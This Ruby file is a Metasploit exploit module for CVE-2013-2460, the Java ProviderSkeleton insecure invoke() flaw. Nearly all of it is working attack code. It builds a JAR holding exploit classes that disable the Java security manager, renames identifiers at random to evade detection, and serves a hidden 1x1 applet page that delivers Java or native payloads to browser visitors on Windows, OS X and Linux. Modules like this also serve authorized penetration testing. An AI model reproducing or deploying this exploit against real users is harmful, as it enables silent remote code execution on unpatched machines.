# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
require &#039;rex&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking # Because there isn&#039;t click2play bypass, plus now Java Security Level High by default
 
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE
 
  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({ :javascript => false })
 
  EXPLOIT_STRING = "Exploit"
 
  def initialize( info = {} )
 
    super( update_info( info,
      &#039;Name&#039;          => &#039;Java Applet ProviderSkeleton Insecure Invoke Method&#039;,
      &#039;Description&#039;   => %q{
          This module abuses the insecure invoke() method of the ProviderSkeleton class that
        allows to call arbitrary static methods with user supplied arguments. The vulnerability
        affects Java version 7u21 and earlier.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        =>
        [
          &#039;Adam Gowdiak&#039;, # Vulnerability discovery according to Oracle&#039;s advisory and also POC
          &#039;Matthias Kaiser&#039; # Metasploit module
        ],
      &#039;References&#039;    =>
        [
          [ &#039;CVE&#039;, &#039;2013-2460&#039; ],
          [ &#039;OSVDB&#039;, &#039;94346&#039; ],
          [ &#039;URL&#039;, &#039;http://www.oracle.com/technetwork/topics/security/javacpujun2013-1899847.html&#039;],
          [ &#039;URL&#039;, &#039;http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/rev/160cde99bb1a&#039; ],
          [ &#039;URL&#039;, &#039;http://www.security-explorations.com/materials/SE-2012-01-ORACLE-12.pdf&#039; ],
          [ &#039;URL&#039;, &#039;http://www.security-explorations.com/materials/se-2012-01-61.zip&#039; ]
        ],
      &#039;Platform&#039;      => [ &#039;java&#039;, &#039;win&#039;, &#039;osx&#039;, &#039;linux&#039; ],
      &#039;Payload&#039;       => { &#039;Space&#039; => 20480, &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
      &#039;Targets&#039;       =>
        [
          [ &#039;Generic (Java Payload)&#039;,
            {
              &#039;Platform&#039; => [&#039;java&#039;],
              &#039;Arch&#039; => ARCH_JAVA,
            }
          ],
          [ &#039;Windows x86 (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;,
              &#039;Arch&#039; => ARCH_X86,
            }
          ],
          [ &#039;Mac OS X x86 (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;osx&#039;,
              &#039;Arch&#039; => ARCH_X86,
            }
          ],
          [ &#039;Linux x86 (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039; => ARCH_X86,
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 18 2013&#039;
    ))
  end
 
  def randomize_identifier_in_jar(jar, identifier)
    identifier_str = rand_text_alpha(identifier.length)
    jar.entries.each { |entry|
      entry.name.gsub!(identifier, identifier_str)
      entry.data = entry.data.gsub(identifier, identifier_str)
    }
  end
 
 
  def setup
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-2460", "Exploit.class")
    @exploit_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-2460", "ExpProvider.class")
    @provider_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-2460", "DisableSecurityManagerAction.class")
    @action_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
 
    @exploit_class_name = rand_text_alpha(EXPLOIT_STRING.length)
    @exploit_class.gsub!(EXPLOIT_STRING, @exploit_class_name)
 
    super
  end
 
  def on_request_uri(cli, request)
    print_status("handling request for #{request.uri}")
 
    case request.uri
    when /\.jar$/i
      jar = payload.encoded_jar
      jar.add_file("#{@exploit_class_name}.class", @exploit_class)
      jar.add_file("ExpProvider.class", @provider_class)
      jar.add_file("DisableSecurityManagerAction.class", @action_class)
      randomize_identifier_in_jar(jar, "metasploit")
      randomize_identifier_in_jar(jar, "payload")
      jar.build_manifest
 
      send_response(cli, jar, { &#039;Content-Type&#039; => "application/octet-stream" })
    when /\/$/
      payload = regenerate_payload(cli)
      if not payload
        print_error("Failed to generate the payload.")
        send_not_found(cli)
        return
      end
      send_response_html(cli, generate_html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
    else
      send_redirect(cli, get_resource() + &#039;/&#039;, &#039;&#039;)
    end
 
  end
 
  def generate_html
    html = %Q|
    <html>
    <body>
    <applet archive="#{rand_text_alpha(rand(5) + 3)}.jar" code="#{@exploit_class_name}.class" width="1" height="1"></applet>
    </body>
    </html>
    |
    return html
  end
 
end

